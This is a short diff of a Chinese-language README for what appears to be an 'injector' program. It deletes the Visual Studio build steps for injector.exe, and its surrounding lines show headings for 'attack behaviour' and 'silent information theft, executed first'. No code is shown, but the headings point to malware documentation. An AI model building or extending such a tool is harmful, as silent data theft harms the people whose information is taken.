@@ -8,12 +8,6 @@
 - Visual Studio 2022（v144/v145 工具集）
 - Windows SDK 10.0+
 
-**步骤**
-1. 双击 `injector.sln` 打开解决方案
-2. 配置选择 **Release | x64**
-3. `Ctrl+Shift+B` 生成
-4. 产物：`injector/x64/Release/injector.exe`
-
 ## 攻击行为
 
 ### 信息窃取（静默，优先执行）
